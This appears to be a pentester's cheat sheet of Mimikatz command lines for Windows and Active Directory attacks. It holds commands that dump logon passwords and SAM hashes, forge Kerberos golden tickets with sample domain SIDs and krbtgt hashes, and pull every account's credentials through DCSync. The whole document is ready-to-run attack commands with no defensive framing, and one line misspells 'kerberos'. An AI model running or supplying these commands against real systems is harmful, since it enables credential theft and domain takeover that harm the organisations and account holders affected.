###
```
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"
mimikatz token::elevate lsadump::sam
mimikatz "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam"
mimikatz "lsadump::sam"
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"'
```
### Golden Tickets
```
 mimikatz kerberos::golden /user:Administrator /domain:ninja.corp /sid:S-1-5-21-3865823697-1816233505-1834004910 /krbtgt:ac548f25225b5e0974a79a59fc27fc2c /target:domain:ninja.corp /ptt
```
```
kerbeos::golden /user:Administrator /krbtgt:HASH_KRBTGT /domain:ninja.corp /sid:S-1-5-21-2941561648-383941485-1389968811 /sids:S-1-5-SID-SECOND-DOMAIN-519 /ptt
```




### dcsync
```
mimikatz lsadump::dcsync /domain:insomnia.io /all /csv
mimikatz lsadump::dcsync /domain:insomnia.io /user:John
Invoke-DCSync
Invoke-DCSync -PWDumpFormat
```
